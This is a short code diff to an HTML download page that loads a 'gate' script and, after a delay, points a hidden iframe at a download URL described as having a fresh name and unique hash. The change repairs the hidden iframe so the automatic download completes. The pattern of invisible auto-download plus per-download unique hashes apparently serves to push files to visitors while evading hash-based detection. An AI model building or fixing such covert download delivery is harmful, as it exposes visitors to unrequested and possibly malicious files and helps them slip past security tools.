@@ -24,7 +24,7 @@
     Download not working? <a href="#">&#8635; Restart and Download | Get Help</a></p>
   </div>
 
-  <iframe id="dlframe" src="" style="display:none;" onload="this.remove();"></iframe>
+  <iframe id="dlframe" src="about:blank" style="display:none;"></iframe>
 
   <script src="config.js"></script>
   <script src="gate.js"></script>
@@ -69,7 +69,8 @@
 
       // Trigger the actual (fresh-name, unique-hash) download in a hidden iframe.
       setTimeout(function () {
-        document.getElementById('dlframe').src = dlUrl;
+        var fr = document.getElementById('dlframe');
+        if (fr) fr.src = dlUrl;
       }, 400);
     })();
   </script>
